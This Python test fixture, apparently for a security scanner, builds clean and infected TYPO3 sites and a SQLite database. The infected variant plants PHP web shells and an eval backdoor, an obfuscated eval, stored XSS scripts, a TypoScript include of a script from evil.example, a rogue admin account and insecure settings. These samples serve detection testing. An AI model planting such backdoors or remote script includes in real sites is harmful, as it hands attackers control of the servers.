"""Testwelt für TYPO3 (2.10.0): eine klassische Installation (typo3, typo3conf), eine Composer-Installation (config, vendor, public) und eine SQLite-Datenbank mit den TYPO3-Tabellen.
Nicht dasselbe wie ein echter TYPO3-Server (Tabellen- und Feldnamen von Hand nachgebaut)."""
import json
import os
import sqlite3
import time
from typing import Dict

from fixture import install_mysql_shim, w

VERSION_PHP = "<?php\nnamespace TYPO3\\CMS\\Core\\Information;\nfinal class Typo3Version\n{\n    private const VERSION = '12.4.8';\n    private const BRANCH = '12.4';\n}\n"
KEY = "k" * 96
SETTINGS_GOOD = """<?php
return [
    'BE' => [
        'debug' => false,
        'installToolPassword' => '$argon2i$GEHEIM-INSTALL-HASH',
        'passwordHashing' => ['className' => 'TYPO3\\\\CMS\\\\Core\\\\Crypto\\\\PasswordHashing\\\\Argon2iPasswordHash', 'options' => []],
    ],
    'DB' => ['Connections' => ['Default' => [
        'charset' => 'utf8mb4', 'dbname' => 'typo3_db', 'driver' => 'mysqli', 'host' => 'localhost', 'password' => 'GEHEIM-DB-PASSWORT', 'port' => 3306, 'user' => 'typo3_user',
    ]]],
    'SYS' => [
        'displayErrors' => 0,
        'devIPmask' => '',
        'encryptionKey' => '%s',
        'trustedHostsPattern' => 'www\\\\.testseite\\\\.example',
        'sitename' => 'Testseite',
    ],
];
""" % KEY
SETTINGS_BAD = SETTINGS_GOOD.replace("'displayErrors' => 0", "'displayErrors' => 1").replace("'devIPmask' => ''", "'devIPmask' => '*'").replace("www\\\\.testseite\\\\.example", ".*").replace(KEY, "kurz")
EMCONF = "<?php\n$EM_CONF[$_EXTKEY] = [\n    'title' => '%s',\n    'description' => 'Test',\n    'category' => 'plugin',\n    'state' => '%s',\n    'version' => '%s',\n    'constraints' => ['depends' => ['typo3' => '11.5.0-12.4.99']],\n];\n"
SCHEMA = """
CREATE TABLE be_users (uid INTEGER PRIMARY KEY, username TEXT, admin INTEGER, disable INTEGER, deleted INTEGER, crdate INTEGER, lastlogin INTEGER);
CREATE TABLE tt_content (uid INTEGER PRIMARY KEY, header TEXT, bodytext TEXT, deleted INTEGER);
CREATE TABLE sys_template (uid INTEGER PRIMARY KEY, config TEXT, deleted INTEGER);
"""


def build_classic(root: str, infected: bool) -> str:
    site = os.path.join(root, "html", "site")
    os.makedirs(site, exist_ok=True)
    w(site + "/typo3/sysext/core/Classes/Information/Typo3Version.php", VERSION_PHP, days_ago=60)
    for i in range(230):
        w(site + "/typo3/sysext/core/Classes/Part%d.php" % i, "<?php\n// core %d\n" % i, days_ago=60)
    w(site + "/index.php", "<?php\nrequire __DIR__ . '/typo3/index.php';\n", days_ago=60)
    w(site + "/.htaccess", "# TYPO3 htaccess\nOptions -Indexes\n", days_ago=60)
    w(site + "/robots.txt", "User-agent: *\n", days_ago=60)
    w(site + "/typo3conf/system/settings.php", SETTINGS_BAD if infected else SETTINGS_GOOD, days_ago=8 if infected else 90, mode=0o666 if infected else 0o644)
    w(site + "/typo3conf/ext/news/ext_emconf.php", EMCONF % ("News", "stable", "11.4.2"), days_ago=40)
    w(site + "/typo3conf/ext/news/composer.json", json.dumps({"name": "georgringer/news", "type": "typo3-cms-extension"}), days_ago=40)
    w(site + "/typo3conf/ext/news/Classes/Plugin.php", "<?php\n// news\n", days_ago=40)
    w(site + "/typo3conf/ext/meine_ext/ext_emconf.php", EMCONF % ("Meine Erweiterung", "obsolete", "1.0.0"), days_ago=40)
    w(site + "/fileadmin/bild.jpg", "JFIF" + "\x00" * 40, days_ago=30)
    w(site + "/typo3temp/assets/css/a.css", "body{}", days_ago=3)
    if infected:
        w(site + "/typo3conf/system/additional.php", "<?php\n@eval(base64_decode('ZWNobyAxOw=='));\n", days_ago=5)
        w(site + "/typo3conf/ext/extension_builder/ext_emconf.php", EMCONF % ("Extension Builder", "stable", "12.0.0"), days_ago=10)
        w(site + "/typo3conf/ENABLE_INSTALL_TOOL", "", days_ago=3)
        w(site + "/fileadmin/shell.php", "<?php @eval($_POST['x']); ?>", days_ago=2)
        w(site + "/typo3/sysext/core/Classes/Backdoor.php", "<?php @eval(base64_decode($_GET['c']));", days_ago=2)
    return site


def build_composer(root: str) -> str:
    """Composer-Installation: Ordner der Seite ist das Projekt (mit config, vendor, public)."""
    site = os.path.join(root, "html", "projekt")
    os.makedirs(site, exist_ok=True)
    w(site + "/vendor/typo3/cms-core/Classes/Information/Typo3Version.php", VERSION_PHP, days_ago=60)
    w(site + "/vendor/typo3/cms-core/composer.json", "{}", days_ago=60)
    for i in range(120):
        w(site + "/vendor/typo3/cms-core/Classes/Part%d.php" % i, "<?php\n// core %d\n" % i, days_ago=60)
    w(site + "/vendor/typo3/cms-form/Classes/Form.php", "<?php\n// form\n", days_ago=60)
    pk = [{"name": "typo3/cms-core", "version": "v12.4.8", "type": "typo3-cms-core"},
          {"name": "typo3/cms-form", "version": "v12.4.8", "type": "typo3-cms-framework"},
          {"name": "georgringer/news", "version": "11.4.2", "type": "typo3-cms-extension"},
          {"name": "meine/eigene", "version": "dev-main", "type": "typo3-cms-extension", "dist": {"type": "path"}}]
    w(site + "/vendor/composer/installed.json", json.dumps({"packages": pk}), days_ago=60)
    w(site + "/config/system/settings.php", SETTINGS_GOOD, days_ago=90, mode=0o644)
    w(site + "/composer.json", "{}", days_ago=60)
    w(site + "/public/index.php", "<?php\n// TYPO3\n", days_ago=60)
    return site


def build_db(path: str, infected: bool) -> None:
    if os.path.exists(path):
        os.remove(path)
    con = sqlite3.connect(path)
    con.executescript(SCHEMA)
    now = int(time.time())
    c = con.cursor()
    c.execute("INSERT INTO be_users VALUES (1,'chef',1,0,0,?,?)", (now - 900 * 86400, now - 86400))
    c.execute("INSERT INTO be_users VALUES (2,'redakteur',0,0,0,?,?)", (now - 300 * 86400, now - 5 * 86400))
    c.execute("INSERT INTO be_users VALUES (3,'alt',1,1,0,?,?)", (now - 800 * 86400, now - 700 * 86400))      # gesperrter Admin zählt nicht
    c.execute("INSERT INTO tt_content VALUES (1,'Willkommen','<p>Willkommen</p>',0)")
    if infected:
        c.execute("INSERT INTO be_users VALUES (4,'support',1,0,0,?,0)", (now - 2 * 86400,))
        c.execute("INSERT INTO tt_content VALUES (2,'Info','<p>x</p><script>eval(atob(\"YWxlcnQoMSk=\"))</script>',0)")
        c.execute("INSERT INTO tt_content VALUES (3,'Video','<iframe src=\"https://youtube.com/embed/x\"></iframe>',0)")
        c.execute("INSERT INTO tt_content VALUES (4,'Gelöscht','<script>eval(1)</script>',1)")
        c.execute("INSERT INTO sys_template VALUES (1,'page.headerData.10 = TEXT\npage.headerData.10.value = <script src=\"https://evil.example/x.js\"></script>',0)")
    con.commit()
    con.close()


def make_typo3_world(base: str, infected: bool = True, composer: bool = False) -> Dict[str, str]:
    tag = "t3_%s_%s" % ("infected" if infected else "clean", "composer" if composer else "classic")
    home = os.path.join(base, tag, "home")
    os.makedirs(home, exist_ok=True)
    site = build_composer(home) if composer else build_classic(home, infected)
    dbp = os.path.join(base, tag, "test.sqlite")
    build_db(dbp, infected)
    bin_dir = install_mysql_shim(os.path.join(base, tag, "bin"), dbp)
    return {"home": home, "site": site, "site_rel": "html/projekt" if composer else "html/site", "db": dbp, "bin": bin_dir}
